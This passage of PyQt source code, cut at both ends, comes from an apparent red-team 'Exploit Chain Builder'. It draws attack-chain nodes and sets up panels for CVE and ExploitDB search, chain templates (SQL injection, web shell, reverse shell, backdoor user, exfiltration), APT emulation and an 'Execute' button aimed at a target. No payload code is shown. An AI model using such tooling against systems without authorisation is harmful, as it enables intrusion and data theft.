                color = QColor(0, 255, 100) if self.connection_type == 'success' else QColor(255, 80, 80)
                painter.setPen(QPen(color, 2, Qt.PenStyle.DashLine))
                painter.drawLine(int(x1), int(y1), self.mouse_pos.x(), self.mouse_pos.y())
        
        # Draw animated particles along connections
        for particle in self.particles:
            from_node = next((n for n in self.nodes if n['id'] == particle['from']), None)
            to_node = next((n for n in self.nodes if n['id'] == particle['to']), None)
            
            if from_node and to_node:
                x1, y1 = from_node['x'] + 120, from_node['y'] + 30
                x2, y2 = to_node['x'], to_node['y'] + 30
                
                # Interpolate position
                t = particle['progress']
                px = x1 + (x2 - x1) * t
                py = y1 + (y2 - y1) * t
                
                # Draw glowing particle
                color = type_colors.get(from_node['type'], QColor(0, 255, 0))
                glow = QRadialGradient(px, py, particle['size'] * 3)
                glow.setColorAt(0, QColor(color.red(), color.green(), color.blue(), 200))
                glow.setColorAt(0.5, QColor(color.red(), color.green(), color.blue(), 100))
                glow.setColorAt(1, QColor(color.red(), color.green(), color.blue(), 0))
                
                painter.setPen(Qt.PenStyle.NoPen)
                painter.setBrush(QBrush(glow))
                painter.drawEllipse(int(px - particle['size'] * 3), int(py - particle['size'] * 3),
                                   particle['size'] * 6, particle['size'] * 6)
                
                # Solid center
                painter.setBrush(QBrush(QColor(255, 255, 255)))
                painter.drawEllipse(int(px - particle['size']/2), int(py - particle['size']/2),
                                   particle['size'], particle['size'])
        
        # Draw nodes with enhanced styling
        for i, node in enumerate(self.nodes):
            color = type_colors.get(node['type'], QColor(0, 255, 0))
            is_selected = node['id'] == self.selected_node_id
            is_executed = node['id'] in self.executed_nodes
            is_failed = node['id'] in self.failed_nodes
            is_current = self.is_executing and i == self.current_execution_step
            
            # Execution state colors
            if is_failed:
                border_color = QColor(255, 50, 50)
            elif is_current:
                # Pulsing effect for current node
                pulse = 0.5 + 0.5 * math.sin(self.execution_progress * math.pi * 4)
                border_color = QColor(255, 255, 255, int(150 + 105 * pulse))
            elif is_executed:
                border_color = QColor(0, 255, 100)
            else:
                border_color = color
            
            # Selection glow effect
            if is_selected or is_current:
                glow_radius = 15 if is_current else 10
                glow = QRadialGradient(node['x'] + 60, node['y'] + 30, 80)
                glow.setColorAt(0, QColor(border_color.red(), border_color.green(), border_color.blue(), 80))
                glow.setColorAt(1, QColor(border_color.red(), border_color.green(), border_color.blue(), 0))
                painter.setBrush(QBrush(glow))
                painter.setPen(Qt.PenStyle.NoPen)
                painter.drawEllipse(node['x'] - 20, node['y'] - 20, 160, 100)
            
            # Node background with gradient
            node_gradient = QLinearGradient(node['x'], node['y'], node['x'], node['y'] + 60)
            node_gradient.setColorAt(0, QColor(color.red(), color.green(), color.blue(), 100 if is_selected else 60))
            node_gradient.setColorAt(1, QColor(color.red(), color.green(), color.blue(), 50 if is_selected else 30))
            
            border_width = 3 if (is_selected or is_current) else 2
            painter.setPen(QPen(border_color, border_width))
            painter.setBrush(QBrush(node_gradient))
            painter.drawRoundedRect(node['x'], node['y'], 120, 60, 8, 8)
            
            # Execution status icon
            status_icon = ""
            if is_failed:
                status_icon = "‚ùå"
            elif is_executed and not is_current:
                status_icon = "‚úÖ"
            elif is_current:
                status_icon = "‚ö°"
            
            if status_icon:
                painter.setFont(QFont('Consolas', 12))
                painter.setPen(QPen(QColor(255, 255, 255)))
                painter.drawText(node['x'] + 100, node['y'] + 18, status_icon)
            
            # Node text
            painter.setPen(QPen(QColor(255, 255, 255) if (is_selected or is_current) else color))
            painter.setFont(QFont('Consolas', 10, QFont.Weight.Bold))
            painter.drawText(node['x'] + 10, node['y'] + 25, node['name'][:14])
            
            # Type label and MITRE ID
            painter.setFont(QFont('Consolas', 8))
            painter.setPen(QPen(QColor(180, 180, 180)))
            type_label = node['type'].upper()
            if node.get('mitre_id'):
                type_label += f" | {node['mitre_id']}"
            painter.drawText(node['x'] + 10, node['y'] + 42, type_label[:18])
            
            # CVE badge if present
            if node.get('cve'):
                painter.setFont(QFont('Consolas', 7))
                painter.setPen(QPen(QColor(255, 100, 100)))
                painter.drawText(node['x'] + 10, node['y'] + 55, node['cve'][:15])
            
            # Success probability indicator (mini bar on right side)
            success_prob = self.get_node_success_probability(node['id'])
            prob_height = int(50 * success_prob)
            prob_y = node['y'] + 5 + (50 - prob_height)
            
            # Background bar
            painter.setPen(Qt.PenStyle.NoPen)
            painter.setBrush(QBrush(QColor(40, 40, 40)))
            painter.drawRect(node['x'] + 115, node['y'] + 5, 4, 50)
            
            # Probability fill (green to red gradient based on probability)
            if success_prob >= 0.7:
                prob_color = QColor(0, 255, 100)
            elif success_prob >= 0.4:
                prob_color = QColor(255, 200, 0)
            else:
                prob_color = QColor(255, 80, 80)
            
            painter.setBrush(QBrush(prob_color))
            painter.drawRect(node['x'] + 115, prob_y, 4, prob_height)
            
            # Probability text on hover (show if selected)
            if is_selected:
                painter.setFont(QFont('Consolas', 8))
                painter.setPen(QPen(prob_color))
                painter.drawText(node['x'] + 85, node['y'] + 55, f"{int(success_prob * 100)}%")
            
            # Branch indicators (if node has branches)
            if node['id'] in self.branches:
                branch = self.branches[node['id']]
                # Success branch indicator (green dot)
                if branch.success_target_id:
                    painter.setBrush(QBrush(QColor(0, 255, 100)))
                    painter.setPen(Qt.PenStyle.NoPen)
                    painter.drawEllipse(node['x'] + 118, node['y'] + 25, 8, 8)
                # Failure branch indicator (red dot)
                if branch.failure_target_id:
                    painter.setBrush(QBrush(QColor(255, 80, 80)))
                    painter.drawEllipse(node['x'] + 118, node['y'] + 40, 8, 8)
            
            # Delete hint for selected node
            if is_selected and not self.is_executing:
                painter.setFont(QFont('Consolas', 10))
                painter.setPen(QPen(QColor(200, 100, 100)))
                painter.drawText(node['x'] + 105, node['y'] + 18, '‚úï')
        
        # Instructions
        if not self.nodes:
            painter.setPen(QPen(QColor(100, 100, 120)))
            painter.setFont(QFont('Consolas', 12))
            painter.drawText(self.rect(), Qt.AlignmentFlag.AlignCenter,
                           "üéØ Drag exploits here to build your attack chain\nor double-click an exploit in the library\n\nüí° Search real CVEs and exploits above")
        
        # Drop preview indicator
        if self.drop_preview_pos:
            painter.setPen(QPen(QColor(0, 255, 0), 2, Qt.PenStyle.DashLine))
            painter.setBrush(QBrush(QColor(0, 255, 0, 40)))
            painter.drawRoundedRect(
                self.drop_preview_pos.x() - 60, 
                self.drop_preview_pos.y() - 30,
                120, 60, 8, 8
            )
        
        # Execution status overlay
        if self.is_executing:
            painter.setPen(QPen(QColor(0, 255, 100)))
            painter.setFont(QFont('Consolas', 11, QFont.Weight.Bold))
            step_text = f"‚ö° Executing Step {self.current_execution_step + 1}/{len(self.nodes)}"
            painter.drawText(10, self.height() - 15, step_text)
        
        painter.end()
    
    def get_node_at(self, pos: QPoint):
        """Find node at given position"""
        for node in reversed(self.nodes):  # Check top nodes first
            if (node['x'] <= pos.x() <= node['x'] + 120 and
                node['y'] <= pos.y() <= node['y'] + 60):
                return node
        return None
    
    def mousePressEvent(self, event):
        """Handle mouse press for node selection and dragging"""
        if event.button() == Qt.MouseButton.LeftButton:
            pos = event.pos()
            node = self.get_node_at(pos)
            
            if node:
                # Check if clicked on delete button (top-right corner)
                if (node['x'] + 80 <= pos.x() <= node['x'] + 120 and
                    node['y'] <= pos.y() <= node['y'] + 20 and
                    node['id'] == self.selected_node_id):
                    self.delete_node(node['id'])
                    return
                
                # Select and prepare to drag
                self.selected_node_id = node['id']
                self.dragging_node = node
                self.drag_offset = QPoint(pos.x() - node['x'], pos.y() - node['y'])
                self.node_clicked.emit(node)
                self.setCursor(Qt.CursorShape.ClosedHandCursor)
            else:
                # Clicked on empty space - deselect
                self.selected_node_id = None
                self.node_clicked.emit({})
            
            self.update()
        super().mousePressEvent(event)
    
    def mouseMoveEvent(self, event):
        """Handle mouse move for dragging nodes and branch creation preview"""
        self.mouse_pos = event.pos()  # Track for branch creation preview
        
        if self.dragging_node and event.buttons() & Qt.MouseButton.LeftButton:
            new_x = max(0, min(self.width() - 120, event.pos().x() - self.drag_offset.x()))
            new_y = max(0, min(self.height() - 60, event.pos().y() - self.drag_offset.y()))
            self.dragging_node['x'] = new_x
            self.dragging_node['y'] = new_y
            self.update()
        elif self.creating_connection:
            # Update for branch creation preview
            self.update()
        else:
            # Change cursor when hovering over nodes
            node = self.get_node_at(event.pos())
            if node:
                self.setCursor(Qt.CursorShape.OpenHandCursor)
            else:
                self.setCursor(Qt.CursorShape.ArrowCursor)
        super().mouseMoveEvent(event)
    
    def mouseReleaseEvent(self, event):
        """Handle mouse release to stop dragging"""
        if event.button() == Qt.MouseButton.LeftButton:
            self.dragging_node = None
            node = self.get_node_at(event.pos())
            if node:
                self.setCursor(Qt.CursorShape.OpenHandCursor)
            else:
                self.setCursor(Qt.CursorShape.ArrowCursor)
        super().mouseReleaseEvent(event)
    
    def keyPressEvent(self, event):
        """Handle keyboard shortcuts"""
        if event.key() == Qt.Key.Key_Delete or event.key() == Qt.Key.Key_Backspace:
            if self.selected_node_id:
                self.delete_node(self.selected_node_id)
        elif event.key() == Qt.Key.Key_Escape:
            self.selected_node_id = None
            self.update()
            self.node_clicked.emit({})
        super().keyPressEvent(event)
    
    def delete_node(self, node_id: str):
        """Delete a node and its connections"""
        # Remove node
        self.nodes = [n for n in self.nodes if n['id'] != node_id]
        # Remove connections involving this node
        self.connections = [(f, t) for f, t in self.connections if f != node_id and t != node_id]
        self.selected_node_id = None
        self.node_deleted.emit(node_id)
        self.update()
        
        # Notify parent to update stats
        parent = self.parent()
        while parent:
            if hasattr(parent, 'update_stats'):
                parent.update_stats()
                break
            parent = parent.parent()
    
    def auto_arrange(self):
        """Auto-arrange nodes by type in columns"""
        if not self.nodes:
            return
        
        # Group by type
        type_order = ['recon', 'exploit', 'payload', 'persistence', 'exfil']
        type_groups = {t: [] for t in type_order}
        
        for node in self.nodes:
            node_type = node.get('type', 'exploit')
            if node_type in type_groups:
                type_groups[node_type].append(node)
            else:
                type_groups['exploit'].append(node)
        
        # Arrange in columns
        x = 50
        for node_type in type_order:
            nodes = type_groups[node_type]
            if nodes:
                y = 50
                for node in nodes:
                    node['x'] = x
                    node['y'] = y
                    y += 80
                x += 150
        
        self.update()
    
    def duplicate_selected(self):
        """Duplicate the selected node"""
        if not self.selected_node_id:
            return None
        
        # Find selected node
        source = next((n for n in self.nodes if n['id'] == self.selected_node_id), None)
        if not source:
            return None
        
        # Create duplicate
        new_id = f"node_{len(self.nodes) + 1}"
        new_node = {
            'id': new_id,
            'name': source['name'] + ' (copy)',
            'type': source['type'],
            'x': source['x'] + 30,
            'y': source['y'] + 30
        }
        self.nodes.append(new_node)
        self.update()
        return new_node


class ExploitChainBuilderPage(QWidget):
    """Exploit Chain Builder page for visual attack orchestration"""
    
    # Pre-built attack chain templates for quick starts
    TEMPLATES = {
        "template_1": {
            "name": "Recon ‚Üí Exploit ‚Üí Persist",
            "description": "Full reconnaissance to persistence chain",
            "nodes": [
                ("Port Scanner", "recon", 50, 100),
                ("Service Enum", "recon", 50, 200),
                ("SQL Injection", "exploit", 200, 150),
                ("Web Shell", "payload", 350, 150),
                ("Cron Job", "persistence", 500, 150),
            ]
        },
        "template_2": {
            "name": "SQLi ‚Üí Data Exfil",
            "description": "SQL injection and data extraction",
            "nodes": [
                ("Web Fingerprint", "recon", 50, 150),
                ("SQL Injection", "exploit", 200, 150),
                ("HTTP Exfil", "exfil", 350, 150),
            ]
        },
        "template_3": {
            "name": "Cred Spray ‚Üí Lateral Move",
            "description": "Credential attack with lateral movement",
            "nodes": [
                ("DNS Recon", "recon", 50, 100),
                ("Auth Bypass", "exploit", 200, 100),
                ("Meterpreter", "payload", 350, 100),
                ("Service Install", "persistence", 500, 100),
                ("Cloud Exfil", "exfil", 650, 100),
            ]
        },
        "template_4": {
            "name": "Web App Full Attack",
            "description": "Complete web application compromise",
            "nodes": [
                ("Web Fingerprint", "recon", 50, 80),
                ("Port Scanner", "recon", 50, 180),
                ("SQL Injection", "exploit", 200, 80),
                ("RCE Exploit", "exploit", 200, 180),
                ("Reverse Shell", "payload", 350, 130),
                ("Backdoor User", "persistence", 500, 130),
                ("DNS Exfil", "exfil", 650, 130),
            ]
        },
        "template_5": {
            "name": "Stealth Recon Only",
            "description": "Low-noise reconnaissance phase",
            "nodes": [
                ("DNS Recon", "recon", 50, 100),
                ("Web Fingerprint", "recon", 200, 100),
                ("Service Enum", "recon", 350, 100),
            ]
        },
    }
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.chain_counter = 0
        self.undo_stack = []  # For undo functionality
        self.setup_ui()
        self.load_exploit_library()
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        
        # Header
        header = QFrame()
        header.setStyleSheet("background: #111; border-bottom: 1px solid #00ff00;")
        header_layout = QHBoxLayout(header)
        
        title = QLabel("‚õìÔ∏è Exploit Chain Builder")
        title.setStyleSheet("color: #00ff00; font-size: 18px; font-weight: bold;")
        header_layout.addWidget(title)
        
        header_layout.addStretch()
        
        # Chain name
        name_label = QLabel("Chain Name:")
        name_label.setStyleSheet("color: #888;")
        header_layout.addWidget(name_label)
        
        self.chain_name = QLineEdit()
        self.chain_name.setPlaceholderText("Enter chain name...")
        self.chain_name.setText("attack_chain_001")
        self.chain_name.setFixedWidth(200)
        self.chain_name.setStyleSheet("""
            QLineEdit {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #333;
                padding: 5px;
            }
        """)
        header_layout.addWidget(self.chain_name)
        
        # Target input
        target_label = QLabel("üéØ Target:")
        target_label.setStyleSheet("color: #ff4444; font-weight: bold;")
        header_layout.addWidget(target_label)
        
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("https://target.com or 192.168.1.1")
        self.target_input.setFixedWidth(250)
        self.target_input.setStyleSheet("""
            QLineEdit {
                background: #1a1a1a;
                color: #ff4444;
                border: 1px solid #ff4444;
                padding: 5px;
                border-radius: 4px;
            }
            QLineEdit:focus {
                border: 2px solid #ff6666;
                background: #2a1a1a;
            }
        """)
        self.target_input.setToolTip("Enter target URL (https://...) or IP address")
        header_layout.addWidget(self.target_input)
        
        # Target validation indicator
        self.target_status = QLabel("‚ö™")
        self.target_status.setStyleSheet("font-size: 14px;")
        self.target_status.setToolTip("Target not set")
        header_layout.addWidget(self.target_status)
        self.target_input.textChanged.connect(self._validate_target)
        
        # Actions
        export_btn = QPushButton("üì§ Export")
        export_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #0088ff;
                border: 1px solid #0088ff;
                padding: 8px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #001a33; }
        """)
        export_btn.setToolTip("Export chain to JSON file (Ctrl+Shift+E)")
        export_btn.clicked.connect(self.export_chain)
        header_layout.addWidget(export_btn)
        
        import_btn = QPushButton("üì• Import")
        import_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #0088ff;
                border: 1px solid #0088ff;
                padding: 8px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #001a33; }
        """)
        import_btn.setToolTip("Import chain from JSON file (Ctrl+Shift+I)")
        import_btn.clicked.connect(self.import_chain)
        header_layout.addWidget(import_btn)
        
        save_btn = QPushButton("üíæ Save")
        save_btn.setStyleSheet("""
            QPushButton {
                background: #003300;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #004400; }
        """)
        save_btn.setToolTip("Save chain to library (Ctrl+S)")
        save_btn.clicked.connect(self.save_chain)
        header_layout.addWidget(save_btn)
        
        execute_btn = QPushButton("‚ñ∂ Execute")
        execute_btn.setStyleSheet("""
            QPushButton {
                background: #330000;
                color: #ff0000;
                border: 1px solid #ff0000;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #440000; }
        """)
        execute_btn.setToolTip("Execute the attack chain against the target")
        execute_btn.clicked.connect(self.execute_chain)
        header_layout.addWidget(execute_btn)
        
        # Undo button
        undo_btn = QPushButton("‚Ü© Undo")
        undo_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #888;
                border: 1px solid #333;
                padding: 8px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #252525; color: #fff; }
        """)
        undo_btn.setToolTip("Undo last action (Ctrl+Z)")
        undo_btn.clicked.connect(self.undo_action)
        header_layout.addWidget(undo_btn)
        
        layout.addWidget(header)
        
        # Main content
        content = QSplitter(Qt.Orientation.Horizontal)
        
        # Left - Exploit library with TABBED interface to reduce layout warnings
        left_panel = QFrame()
        left_panel.setStyleSheet("background: #0a0a0a;")
        left_layout = QVBoxLayout(left_panel)
        
        lib_title = QLabel("üìö Exploit Library")
        lib_title.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 14px;")
        left_layout.addWidget(lib_title)
        
        # Create tabbed interface for left panel tools
        self.left_tabs = QTabWidget()
        self.left_tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #333;
                background: #0a0a0a;
            }
            QTabBar::tab {
                background: #1a1a1a;
                color: #888;
                padding: 6px 10px;
                border: 1px solid #333;
                border-bottom: none;
                min-width: 60px;
            }
            QTabBar::tab:selected {
                background: #0a0a0a;
                color: #00ff00;
                border-bottom: 2px solid #00ff00;
            }
            QTabBar::tab:hover {
                color: #00ff00;
            }
        """)
        
        # Tab 1: Search (CVE & Local)
        search_tab = QWidget()
        search_tab_layout = QVBoxLayout(search_tab)
        search_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # CVE/Exploit Search Panel
        search_group = QGroupBox("üîç Search Real CVEs & Exploits")
        search_group.setStyleSheet("""
            QGroupBox {
                color: #ff8800;
                border: 1px solid #ff8800;
                margin-top: 5px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        search_group_layout = QVBoxLayout(search_group)
        
        self.cve_search = QLineEdit()
        self.cve_search.setPlaceholderText("Search CVEs (e.g., apache, sql injection)...")
        self.cve_search.setStyleSheet("""
            QLineEdit {
                background: #1a1a1a;
                color: #ff8800;
                border: 1px solid #444;
                padding: 8px;
                border-radius: 4px;
            }
            QLineEdit:focus { border-color: #ff8800; }
        """)
        self.cve_search.returnPressed.connect(self._search_cves)
        search_group_layout.addWidget(self.cve_search)
        
        search_btn_layout = QHBoxLayout()
        search_cve_btn = QPushButton("üîç Search NVD")
        search_cve_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #ff8800;
                border: 1px solid #ff8800; padding: 6px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2a1a0a; }
        """)
        search_cve_btn.clicked.connect(self._search_cves)
        search_btn_layout.addWidget(search_cve_btn)
        
        search_exploit_btn = QPushButton("üí• ExploitDB")
        search_exploit_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #ff4400;
                border: 1px solid #ff4400; padding: 6px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2a0a0a; }
        """)
        search_exploit_btn.clicked.connect(self._search_exploitdb)
        search_btn_layout.addWidget(search_exploit_btn)
        search_group_layout.addLayout(search_btn_layout)
        
        self.cve_results = QListWidget()
        self.cve_results.setMaximumHeight(120)
        self.cve_results.setStyleSheet("""
            QListWidget {
                background: #0d0d0d;
                color: #e6edf3;
                border: 1px solid #333;
                border-radius: 4px;
            }
            QListWidget::item { padding: 5px; border-bottom: 1px solid #222; }
            QListWidget::item:hover { background: #1a1a2a; }
            QListWidget::item:selected { background: #2a1a0a; }
        """)
        self.cve_results.itemDoubleClicked.connect(self._add_cve_to_chain)
        search_group_layout.addWidget(self.cve_results)
        
        self.search_status = QLabel("üí° Double-click result to add to chain")
        self.search_status.setStyleSheet("color: #666; font-size: 10px;")
        search_group_layout.addWidget(self.search_status)
        
        search_tab_layout.addWidget(search_group)
        
        # Local library search - add to search tab
        search = QLineEdit()
        search.setPlaceholderText("üîç Filter local library...")
        search.setStyleSheet("""
            QLineEdit {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #333;
                padding: 8px;
                border-radius: 4px;
            }
        """)
        search.textChanged.connect(self._filter_library)
        search_tab_layout.addWidget(search)
        
        # Exploit tree with drag support
        self.exploit_tree = QTreeWidget()
        self.exploit_tree.setHeaderHidden(True)
        self.exploit_tree.setDragEnabled(True)
        self.exploit_tree.setDragDropMode(QAbstractItemView.DragDropMode.DragOnly)
        self.exploit_tree.setStyleSheet("""
            QTreeWidget {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #333;
            }
            QTreeWidget::item:hover { background: #252525; }
            QTreeWidget::item:selected { background: #003300; }
        """)
        self.exploit_tree.itemDoubleClicked.connect(self.add_to_chain)
        self.exploit_tree.startDrag = lambda actions: self._start_tree_drag()
        search_tab_layout.addWidget(self.exploit_tree, 1)
        
        # Add search tab to tabs
        self.left_tabs.addTab(search_tab, "üîç Search")
        
        # Tab 2: Templates (Quick Templates + APT Emulation)
        templates_tab = QWidget()
        templates_tab_layout = QVBoxLayout(templates_tab)
        templates_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Quick actions
        quick_group = QGroupBox("‚ö° Quick Templates")
        quick_group.setStyleSheet("""
            QGroupBox {
                color: #00ff00;
                border: 1px solid #333;
                margin-top: 10px;
                padding-top: 10px;
            }
        """)
        quick_layout = QVBoxLayout(quick_group)
        
        templates = [
            ("üîç Recon ‚Üí Exploit ‚Üí Persist", "template_1", "Full reconnaissance to persistence"),
            ("üíâ SQLi ‚Üí Data Exfil", "template_2", "SQL injection and data extraction"),
            ("üîê Cred Spray ‚Üí Lateral", "template_3", "Credential attack with lateral movement"),
            ("üåê Web App Full Attack", "template_4", "Complete web application compromise"),
            ("üëÅÔ∏è Stealth Recon Only", "template_5", "Low-noise reconnaissance phase")
        ]
        
        for name, template_id, tooltip in templates:
            btn = QPushButton(name)
            btn.setStyleSheet("""
                QPushButton {
                    background: #1a1a1a;
                    color: #888;
                    border: 1px solid #333;
                    padding: 6px;
                    text-align: left;
                    border-radius: 3px;
                }
                QPushButton:hover { background: #252525; color: #00ff00; }
            """)
            btn.setToolTip(f"Click to load: {tooltip}")
            btn.clicked.connect(lambda checked, tid=template_id: self.load_template(tid))
            quick_layout.addWidget(btn)
        
        templates_tab_layout.addWidget(quick_group)
        
        # APT Emulation Library
        apt_group = QGroupBox("üé≠ APT Emulation")
        apt_group.setStyleSheet("""
            QGroupBox {
                color: #ff4444;
                border: 1px solid #ff4444;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        apt_layout = QVBoxLayout(apt_group)
        
        self.apt_combo = QComboBox()
        apt_items = [
            ("üêª APT29 - Cozy Bear (RU)", "apt29"),
            ("üêª APT28 - Fancy Bear (RU)", "apt28"),
            ("üêâ APT41 - Double Dragon (CN)", "apt41"),
            ("‚ò†Ô∏è Lazarus Group (NK)", "lazarus"),
            ("üí∞ FIN7 - Carbanak", "fin7"),
            ("üêç Turla - Venomous Bear (RU)", "turla"),
        ]
        for name, apt_id in apt_items:
            self.apt_combo.addItem(name, apt_id)
        self.apt_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a;
                color: #ff4444;
                border: 1px solid #333;
                padding: 5px;
                border-radius: 4px;
            }
        """)
        apt_layout.addWidget(self.apt_combo)
        
        apt_btn_layout = QHBoxLayout()
        
        self.load_apt_btn = QPushButton("üé≠ Load APT Chain")
        self.load_apt_btn.setStyleSheet("""
            QPushButton {
                background: #2a1a1a;
                color: #ff4444;
                border: 1px solid #ff4444;
                padding: 5px 10px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #3a2a2a; }
        """)
        self.load_apt_btn.clicked.connect(self._load_apt_chain)
        apt_btn_layout.addWidget(self.load_apt_btn)
        
        self.apt_info_btn = QPushButton("‚ÑπÔ∏è")
        self.apt_info_btn.setFixedWidth(30)
        self.apt_info_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #888;
                border: 1px solid #333;
                padding: 5px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #252525; color: #ff4444; }
        """)
        self.apt_info_btn.clicked.connect(self._show_apt_info)
        apt_btn_layout.addWidget(self.apt_info_btn)
        
        apt_layout.addLayout(apt_btn_layout)
        
        templates_tab_layout.addWidget(apt_group)
        templates_tab_layout.addStretch()
        
        # Add templates tab
        self.left_tabs.addTab(templates_tab, "üìã Templates")
        
        # Tab 3: Auto Generator
        auto_tab = QWidget()
        auto_tab_layout = QVBoxLayout(auto_tab)
        auto_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Auto Chain Generator
        auto_group = QGroupBox("ü§ñ Auto Generator")
        auto_group.setStyleSheet("""
            QGroupBox {
                color: #00ccff;
                border: 1px solid #00ccff;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        auto_layout = QVBoxLayout(auto_group)
        
        self.target_combo = QComboBox()
        self.target_combo.addItems([
            "üñ•Ô∏è Enterprise Windows",
            "‚òÅÔ∏è AWS Cloud",
            "üåê Web Application",
            "üîå IoT/SCADA",
        ])
        self.target_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a;
                color: #00ccff;
                border: 1px solid #333;
                padding: 5px;
                border-radius: 4px;
            }
        """)
        auto_layout.addWidget(self.target_combo)
        
        self.generate_chain_btn = QPushButton("‚ö° Generate Chain")
        self.generate_chain_btn.setStyleSheet("""
            QPushButton {
                background: #1a2a3a;
                color: #00ccff;
                border: 1px solid #00ccff;
                padding: 6px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2a3a4a; }
        """)
        self.generate_chain_btn.clicked.connect(self._auto_generate_chain)
        auto_layout.addWidget(self.generate_chain_btn)
        
        self.suggest_next_btn = QPushButton("üí° Suggest Next Step")
        self.suggest_next_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #888;
                border: 1px solid #333;
                padding: 5px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #252525; color: #00ccff; }
        """)
        self.suggest_next_btn.clicked.connect(self._suggest_next_step)
        auto_layout.addWidget(self.suggest_next_btn)
        
        auto_tab_layout.addWidget(auto_group)
        auto_tab_layout.addStretch()
        
        # Add auto tab
        self.left_tabs.addTab(auto_tab, "ü§ñ Auto")
        
        # Add tabs to left layout
        left_layout.addWidget(self.left_tabs, 1)
        
        content.addWidget(left_panel)
        
        # Center - Canvas
        center_panel = QFrame()
        center_panel.setStyleSheet("background: #0a0a0a;")
        center_layout = QVBoxLayout(center_panel)
        
        canvas_header = QHBoxLayout()
        
        canvas_title = QLabel("üé® Chain Designer")
        canvas_title.setStyleSheet("color: #00ff00; font-weight: bold;")
        canvas_header.addWidget(canvas_title)
        
        canvas_header.addStretch()
        
        # Auto-arrange button
        arrange_btn = QPushButton("üìê Arrange")
        arrange_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #0088ff;
                border: none;
            }
            QPushButton:hover { color: #00aaff; }
        """)
        arrange_btn.setToolTip("Auto-arrange nodes by type")
        arrange_btn.clicked.connect(self._auto_arrange)
        canvas_header.addWidget(arrange_btn)
        
        # Duplicate button
        dup_btn = QPushButton("üìã Duplicate")
        dup_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #ff8800;
                border: none;
            }
            QPushButton:hover { color: #ffaa00; }
        """)
        dup_btn.setToolTip("Duplicate selected node (Ctrl+D)")
        dup_btn.clicked.connect(self._duplicate_node)
        canvas_header.addWidget(dup_btn)
        
        clear_btn = QPushButton("üóëÔ∏è Clear")
        clear_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #888;
                border: none;
            }
            QPushButton:hover { color: #ff0000; }
        """)
        clear_btn.clicked.connect(self.clear_chain)
        canvas_header.addWidget(clear_btn)
        
        center_layout.addLayout(canvas_header)
        
        self.canvas = ChainCanvas()
        center_layout.addWidget(self.canvas, 1)
        
        # Chain stats
        stats_frame = QFrame()
        stats_frame.setStyleSheet("background: #111; border: 1px solid #333; border-radius: 4px;")
        stats_layout = QHBoxLayout(stats_frame)
        
        self.node_count = QLabel("Nodes: 0")
        self.node_count.setStyleSheet("color: #00ff00;")
        stats_layout.addWidget(self.node_count)
        
        self.conn_count = QLabel("Connections: 0")
        self.conn_count.setStyleSheet("color: #0088ff;")
        stats_layout.addWidget(self.conn_count)
        
        self.risk_label = QLabel("Risk: Low")
        self.risk_label.setStyleSheet("color: #00ff00;")
        stats_layout.addWidget(self.risk_label)
        
        stats_layout.addStretch()
        
        # Keyboard shortcut hints
        shortcut_hint = QLabel("Del: Delete | Ctrl+Z: Undo | Ctrl+D: Duplicate")
        shortcut_hint.setStyleSheet("color: #555; font-size: 10px;")
        stats_layout.addWidget(shortcut_hint)
        
        center_layout.addWidget(stats_frame)
        
        # Timeline / Gantt View Panel
        timeline_group = QGroupBox("üìÖ Attack Timeline")
        timeline_group.setStyleSheet("""
            QGroupBox {
                color: #00ccff;
                border: 1px solid #00ccff;
                margin-top: 5px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        timeline_layout = QVBoxLayout(timeline_group)
        
        # Timeline controls
        timeline_controls = QHBoxLayout()
        
        self.show_timeline_btn = QPushButton("üìä Generate Timeline")
        self.show_timeline_btn.setStyleSheet("""
            QPushButton {
                background: #002233; color: #00ccff;
                border: 1px solid #00ccff; padding: 6px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #003344; }
        """)
        self.show_timeline_btn.clicked.connect(self._generate_timeline)
        timeline_controls.addWidget(self.show_timeline_btn)
        
        self.show_dependencies_cb = QCheckBox("Show Dependencies")
        self.show_dependencies_cb.setChecked(True)
        self.show_dependencies_cb.setStyleSheet("color: #888;")
        self.show_dependencies_cb.toggled.connect(self._toggle_timeline_dependencies)
        timeline_controls.addWidget(self.show_dependencies_cb)
        
        self.show_critical_path_cb = QCheckBox("Critical Path")
